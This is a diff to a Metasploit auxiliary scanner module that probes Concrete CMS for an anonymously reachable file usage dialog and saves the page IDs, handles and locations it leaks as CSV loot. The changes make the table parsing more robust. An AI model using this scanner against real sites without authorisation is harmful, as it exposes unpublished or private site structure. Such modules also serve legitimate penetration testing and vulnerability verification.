@@ -4,6 +4,8 @@
 ##
 
 class MetasploitModule < Msf::Auxiliary
+  EXPECTED_USAGE_COLUMN_COUNT = 4
+
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
@@ -54,19 +56,33 @@ class MetasploitModule < Msf::Auxiliary
     normalize_uri(target_uri.path, 'ccm', 'system', 'dialogs', 'file', 'usage', fid.to_s)
   end
 
+  def usage_table(res)
+    return unless res&.code == 200
+
+    doc = res.get_html_document
+    return unless doc
+
+    doc.search('div.ccm-ui table.table-striped').find do |table|
+      header = table.at_css('thead tr')
+      next false unless header
+
+      header.search('th, td').length == EXPECTED_USAGE_COLUMN_COUNT
+    end
+  end
+
   # Parse the file usage dialog table into an array of [page_id, version, handle, location] rows.
   def parse_usage(res)
-    doc = res.get_html_document
-    return [] unless doc
+    table = usage_table(res)
+    return [] unless table
 
     rows = []
-    doc.search('table.table-striped tr').each do |tr|
+    table.search('tbody tr').each do |tr|
       cells = tr.search('td').map { |td| td.text.strip }
-      # Header row is rendered in <td> inside <thead>; skip it and any empty row.
-      next if cells.empty? || cells.first == 'Page ID'
-      next if cells.all?(&:empty?)
+      # No-results rows can use a single colspan cell. Only complete usage rows count.
+      next if cells.length < EXPECTED_USAGE_COLUMN_COUNT
+      next if cells.first(EXPECTED_USAGE_COLUMN_COUNT).all?(&:empty?)
 
-      rows << cells[0, 4]
+      rows << cells.first(EXPECTED_USAGE_COLUMN_COUNT)
     end
     rows
   end
@@ -78,7 +94,7 @@ class MetasploitModule < Msf::Auxiliary
       print_error("#{peer} - No response from #{usage_uri(datastore['FID_START'])}")
       return
     end
-    unless probe.code == 200 && probe.body.to_s.include?('table-striped')
+    unless usage_table(probe)
       print_error("#{peer} - File usage dialog is not anonymously reachable (patched or not Concrete CMS)")
       return
     end
@@ -112,7 +128,7 @@ class MetasploitModule < Msf::Auxiliary
 
     loot_path = store_loot(
       'concrete_cms.file_usage',
-      'text/plain',
+      'text/csv',
       rhost,
       table.to_csv,
       'concrete_cms_file_usage.csv',
